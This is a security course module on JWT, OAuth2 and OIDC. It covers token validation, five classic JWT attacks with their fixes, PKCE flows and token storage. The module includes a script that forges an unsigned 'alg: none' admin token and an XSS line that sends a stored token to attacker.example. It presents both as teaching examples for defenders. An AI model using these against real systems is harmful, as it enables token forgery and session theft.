# JWT, OAuth2 & OIDC

> **Module 03 · Course 16** — OAuth2 is not an authentication protocol. OIDC is. JWT is not a protocol at all — it's a container. Understanding which layer each lives at is the difference between building a secure delegated-auth flow and building a confused mess that lets attackers swap tokens between systems.

---

## JWT — Structure, Signing, Validation

A JWT (JSON Web Token) is a base64url-encoded structure with three dot-separated parts.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9   ← header
.eyJzdWIiOiJ1c2VyXzk5IiwiaXNzIjoiaHR0cHMuLi4ifQ  ← payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV...  ← signature
```

Decode any JWT at https://jwt.io (never in prod — but useful locally). The header and payload are **not encrypted**. They are base64url-encoded and readable by anyone. The signature is a cryptographic proof that the issuer signed the payload. Reading = free; forging = requires the key.

### Header

```json
{
  "alg": "RS256",    // signing algorithm — this field is attacker-controlled in older libs
  "typ": "JWT"
}
```

### Payload (claims)

```json
{
  "iss": "https://auth.example.com",     // issuer — who created this token
  "sub": "user_99",                      // subject — who this token is about
  "aud": "https://api.example.com",      // audience — who should accept this token
  "exp": 1735683600,                     // expiry (Unix timestamp) — MANDATORY
  "iat": 1735680000,                     // issued-at
  "jti": "a1b2c3d4-...",                 // JWT ID — for revocation tracking
  "roles": ["customer"],                 // custom claims — anything you add
  "email": "user@example.com"
}
```

### Signature

Computed over `base64url(header) + "." + base64url(payload)` using the algorithm specified in the header.

For RS256: `RSA-PKCS1v1.5(SHA256(headerPayload), privateKey)`. Verification uses the corresponding public key — which can be published openly (JWKS endpoint).

### JWT Validation — the full checklist

This is where most bugs live. Validating only the signature is not enough.

```python
import jwt   # PyJWT

PUBLIC_KEYS = load_jwks("https://auth.example.com/.well-known/jwks.json")

def validate_token(token: str) -> dict:
    # CRITICAL: specify algorithms explicitly — never pass algorithms=None or jwt.decode(..., options={"verify_signature": False})
    payload = jwt.decode(
        token,
        PUBLIC_KEYS,
        algorithms=["RS256"],        # whitelist; never ["RS256", "none"]
        audience="https://api.example.com",   # MUST check aud
        issuer="https://auth.example.com",    # MUST check iss
        options={
            "verify_exp": True,      # default True — make it explicit
            "verify_aud": True,      # default True — do not disable
            "require": ["sub", "iat", "jti"],   # fail if missing
        }
    )
    return payload
```

Validation checklist:

1. **Signature valid** — against the key identified by `kid` in the header
2. **`exp` not in the past** — add up to 60 seconds clock skew, no more
3. **`iss` matches your expected issuer** — prevents tokens from other auth servers
4. **`aud` contains your service's identifier** — prevents cross-service token replay
5. **`nbf` is in the past** (if present) — "not before"
6. **`jti` not in your revocation list** — only needed if you implement revocation

---

## The Five Classic JWT Attacks

### Attack 1 — `alg: none`

The JWT spec includes a `"none"` algorithm meaning "no signature, trust me." Older libraries default to accepting any algorithm the header declares. An attacker base64-encodes any payload they want, sets `alg: none`, and sends an unsigned token.

```bash
# craft an unsigned "admin" JWT (header.payload with no signature)
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','roles':['admin']}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

**Fix:** always whitelist algorithms explicitly. Never pass `algorithms=None` or accept algorithm from the token header alone.

### Attack 2 — RS256 → HS256 confusion

An RS256 token is signed with the server's *private* RSA key and verified with the *public* key. The public key is published. If a library accepts both RS256 and HS256, an attacker can take the public key, sign a new payload with it as an HMAC secret (HS256), and present that as a valid token. The library sees `alg: HS256`, uses the public key as the HMAC secret, and the verification passes.

**Fix:** whitelist one algorithm per token type, match issuer to algorithm in your config. Never allow both RS256 and HS256 from the same issuer in the same validator.

### Attack 3 — Missing `aud` check

An access token issued for `api-service-A` is also accepted by `api-service-B` because neither checks `aud`. An attacker with a valid token for A calls B with it.

**Fix:** every resource server MUST check that `aud` contains its own identifier. This is the primary use of the `aud` claim.

### Attack 4 — Storing JWTs in `localStorage`

```
Vulnerable:
  localStorage.setItem("token", jwt)     // readable by any JS on the page

XSS payload:
  fetch("https://attacker.example/steal?t=" + localStorage.getItem("token"))

Result: attacker has a valid JWT, can replay it from anywhere for the token's lifetime.
```

`localStorage` has no `HttpOnly` equivalent. Any XSS — even a third-party script — can read it.

**Fix:** store access tokens in memory (JS variable) and refresh tokens in `HttpOnly` cookies. A page refresh hits a `/token/refresh` endpoint via cookie; the new access token is held in memory only.

### Attack 5 — Long-lived tokens with no revocation

A JWT with a 24-hour expiry and no revocation mechanism means:
- A compromised token is valid for up to 24 hours after logout
- A user cannot invalidate their own tokens (no "sign out all devices")
- A rotated signing key doesn't help until the token expires

**Fix:** use short expiry (5–15 min) for access tokens. Pair with a refresh token flow. For logout or "sign out all devices", maintain a `jti` blocklist in Redis (cheap — the set stays small with short expiry tokens).

---

## OAuth2 — Delegated Authorization

OAuth2 is an **authorization** framework, not an authentication protocol. It answers "may application A access resource B on behalf of user U?" — not "who is U?"

```
                    Resource Owner (User U)
                           │
            grants permission to
                           │
                           ▼
          ┌────────────────────────────────────────┐
          │         Authorization Server            │
          │  (Google, GitHub, your own auth-service)│
          └────────────────────────────────────────┘
                    │ issues access_token
                    ▼
          ┌─────────────────┐
          │   Application   │   presents access_token
          │   (Client)      │ ──────────────────────►  Resource Server (API)
          └─────────────────┘
```

### The four grants

| Grant | Use case | Security notes |
|-------|----------|---------------|
| **Authorization Code + PKCE** | User-facing apps (web, mobile, SPA) | The correct default for anything a human uses |
| **Client Credentials** | Machine-to-machine (daemon, service) | No user; client authenticates with client_id + client_secret |
| **Device Authorization** | Devices with no browser (CLI, TV, IoT) | Short-lived `device_code`; user approves on another device |
| **Refresh Token** | Obtain new access tokens silently | Not a grant on its own; paired with Authorization Code |

The **Implicit Grant** (deprecated) and **Resource Owner Password Credentials** (ROPC, deprecated) should never be used in new code.

### Authorization Code + PKCE — the full dance

PKCE (Proof Key for Code Exchange, RFC 7636) prevents authorization code interception attacks. It is mandatory for public clients (SPAs, mobile) and strongly recommended for all others.

```
1. App generates:
   code_verifier = secrets.token_urlsafe(64)         # random 64-byte string
   code_challenge = base64url(sha256(code_verifier))  # S256 method

2. App redirects user to:
   GET /authorize?
     client_id=app123
     &redirect_uri=https://app.example/callback
     &response_type=code
     &scope=openid profile email
     &state=CSRF_NONCE           ← ties response to this browser session
     &code_challenge=<computed>
     &code_challenge_method=S256

3. User authenticates at the auth server, grants scope.

4. Auth server redirects to:
   https://app.example/callback?code=AUTH_CODE&state=CSRF_NONCE

5. App validates state == CSRF_NONCE (prevents CSRF on the callback)

6. App exchanges code for tokens:
   POST /token
   grant_type=authorization_code
   &code=AUTH_CODE
   &redirect_uri=https://app.example/callback
   &client_id=app123
   &code_verifier=<original verifier>   ← auth server recomputes the challenge and checks

7. Auth server returns:
   {
     "access_token": "eyJ...",    // short-lived
     "token_type": "Bearer",
     "expires_in": 300,
     "refresh_token": "opaque...", // long-lived, store in HttpOnly cookie
     "id_token": "eyJ..."          // OIDC only
   }
```

Why PKCE matters: if the authorization code is intercepted (malicious app on the device, URL logging), the attacker cannot exchange it for tokens without the `code_verifier` — which never left the originating app.

### Client Credentials — M2M

```
POST /token
grant_type=client_credentials
&client_id=service-A
&client_secret=<secret>    ← or use client assertion JWT (mTLS is better for K8s)
&scope=metrics:read

Response: { "access_token": "eyJ...", "expires_in": 3600 }
```

In Kubernetes: use WorkloadIdentity or ServiceAccount tokens projected to pods. Never hard-code `client_secret` in a ConfigMap or Deployment env var — use a Secret, or better, an ExternalSecret + Vault.

```yaml
# Correct: mount client_secret from a Kubernetes Secret
env:
  - name: CLIENT_SECRET
    valueFrom:
      secretKeyRef:
        name: auth-credentials
        key: client_secret
```

### Refresh Token flow

```
Access token expires (exp passed)
  → App sends refresh_token to /token
  → Auth server validates refresh_token (not expired, not revoked)
  → Returns new access_token (and optionally rotated refresh_token)
  → App discards old access_token, stores new one in memory
```

Refresh token rotation: every refresh issues a new refresh token and invalidates the old one. If the old one is presented again (replay), it indicates theft — revoke the entire token family.

---

## OIDC — Authentication on top of OAuth2

OpenID Connect adds an **identity layer** to OAuth2. The auth server returns an `id_token` (a JWT) that proves who the user is.

```
id_token payload:
{
  "iss": "https://accounts.google.com",
  "sub": "104961831456...",       // stable, unique user identifier — use this, not email
  "aud": "your-client-id",
  "exp": 1735683600,
  "iat": 1735680000,
  "email": "user@gmail.com",      // can change; don't use as primary key
  "email_verified": true,
  "name": "Aadarsh Verma",
  "nonce": "random-per-request"   // must match what you sent in /authorize
}
```

**Use `sub` as your user's primary key.** Email changes. Google ID (`sub`) for a given issuer does not. Composite key for multi-provider: `(iss, sub)`.

### OIDC endpoints

Every OIDC provider exposes a discovery document:

```bash
curl https://accounts.google.com/.well-known/openid-configuration
# Returns: authorization_endpoint, token_endpoint, userinfo_endpoint,
#          jwks_uri, id_token_signing_alg_values_supported, ...
```

Always load keys from `jwks_uri` dynamically (cache with a TTL of ~1h). Never hardcode public keys — they rotate.

### id_token vs access_token

| Token | Purpose | Audience | Who validates |
|-------|---------|---------|--------------|
| `id_token` | Proves identity to the client application | Your client_id | Your application |
| `access_token` | Grants access to the resource server (API) | The resource server | The API |

**Never send the `id_token` to your own backend API as a bearer token.** The `aud` is your frontend client ID, not your API. Your API will either reject it (`aud` mismatch) or accept it incorrectly (if it doesn't check `aud`). Get a proper access token with the right `aud` scope instead.

---

## Token Storage & Revocation

### Storage strategy

```
┌─────────────────────────────────────────────────────────────────┐
│ Access token (short-lived, 5–15 min)                           │
│   → Store in memory (JS variable)                              │
│   → Never in localStorage, never in a non-HttpOnly cookie      │
│   → Lost on page reload — that's fine; refresh token recovers it│
├─────────────────────────────────────────────────────────────────┤
│ Refresh token (long-lived)                                     │
│   → Store in HttpOnly + Secure + SameSite=Strict cookie        │
│   → Never in localStorage                                      │
│   → Automatic rotation on use; revoke the family on logout     │
├─────────────────────────────────────────────────────────────────┤
│ id_token                                                       │
│   → Parse at login for claims (name, email); discard afterward │
│   → Don't store; don't forward to your API                     │
└─────────────────────────────────────────────────────────────────┘
```

### Revocation approaches

| Method | Latency | Complexity | Use when |
|--------|---------|-----------|---------|
| Short expiry (< 15 min), no deny-list | Up to expiry | Minimal | Access tokens, tolerates brief window |
| `jti` blocklist in Redis | ~1 ms | Medium | Logout or session termination needs to be immediate |
| Refresh token rotation + family revocation | On next refresh | Medium | Prevents refresh token replay |
| Token introspection (`/introspect` endpoint) | Network RTT per request | High | Resource servers that can't tolerate any stale access |

---

## Debugging JWT, OAuth2 & OIDC

| Symptom | Likely Cause | Fix |
|---------|-------------|-----|
| `alg: none` token accepted | Library allows `alg` to be set by the token header; no algorithm whitelist | Explicitly pass `algorithms=["RS256"]`; upgrade the JWT library |
| Token from service A accepted by service B | Missing `aud` check in service B's validator | Validate `aud` contains the service's own identifier |
| User logs out; JWT still grants access for 10 minutes | Access token has 10-min expiry, no revocation check | Add `jti` to a Redis blocklist on logout; or shorten expiry to 5 min |
| `invalid_grant` on token exchange | `code` already used, or `redirect_uri` mismatch, or `code_verifier` wrong | Authorization codes are single-use; verify redirect_uri is byte-exact including trailing slash |
| PKCE challenge fails | SHA256 of `code_verifier` doesn't match `code_challenge` | Verify no base64 padding (`=`) in the challenge; use standard base64url without padding |
| `aud` claim causes 401 | `aud` is an array and validator checks `aud == "expected"` instead of `"expected" in aud` | Fix the membership check: `aud` can be a string or array per spec |
| Refresh token replay attack | Refresh token stolen from storage; no rotation | Enable refresh token rotation + family revocation; move refresh token to HttpOnly cookie |
| Signed in with Google; email changed; user can't log in | Using email as primary key | Use `(iss, sub)` composite as primary key; email is display-only |

### Debugging with live token introspection

```bash
# Decode a JWT locally (never send to a third-party service in prod)
TOKEN="eyJ..."
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Check expiry (Unix timestamp to human-readable)
EXP=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['exp'])")
date -r $EXP   # macOS; on Linux: date -d @$EXP

# Verify token against JWKS (using PyJWT)
python3 -I -c "
import jwt, json, urllib.request
jwks_url = 'https://auth.example.com/.well-known/jwks.json'
with urllib.request.urlopen(jwks_url) as r:
    jwks = json.load(r)
keys = jwt.PyJWKClient.from_jwks(jwks)
payload = jwt.decode('$TOKEN', keys, algorithms=['RS256'], audience='https://api.example.com')
print(payload)
"
```

### War story: the wrong audience

> **War story.** During a microservices migration at a previous team, we had two APIs behind the same auth server: `analytics-service` and `billing-service`. The analytics service was implemented first and its validator was copied, verbatim, to billing when billing launched. The copy included the `audience` check — hardcoded to `analytics-service`. Nobody caught it in review because the test suite used mocked tokens. In staging, the billing API cheerfully accepted analytics tokens and vice versa. It went to production. Six weeks later, a penetration tester demonstrated that a user could call billing endpoints with a token scoped only for analytics. The fix was adding a fixture to every token validation test that asserts the `aud` check: issue a valid token with `aud: other-service`, confirm it returns 401. That test has blocked wrong-audience bugs three times since.

---

## Checkpoint

You're ready to move on when you can answer these without looking:

1. Decode a JWT from the header, payload, and signature fields by hand. What algorithm would you choose for a new token, and why not HMAC-SHA256 for a multi-service system?
2. Name four claims that MUST be validated on every JWT. What specific attack does each prevent?
3. Describe the `alg: none` attack in two sentences. Write the one line of code that prevents it.
4. Walk through the Authorization Code + PKCE flow step by step. What specifically does PKCE protect against that OAuth2 without PKCE doesn't?
5. Explain the difference between an `id_token` and an `access_token`. Why is it wrong to forward the `id_token` to your own backend API as a Bearer token?
6. A user complains they are still logged in on their old device after changing their password. The system uses 15-minute JWTs. Design the minimal revocation mechanism that closes this gap.
7. Where should you store a refresh token in a browser-based SPA? Where should you store the access token? What attack does each placement defend against?

➡ Next: **SAML & Enterprise SSO** — the XML-based protocol that every corporate customer will ask you to support, and the signature wrapping attacks that have plagued it since 2001.
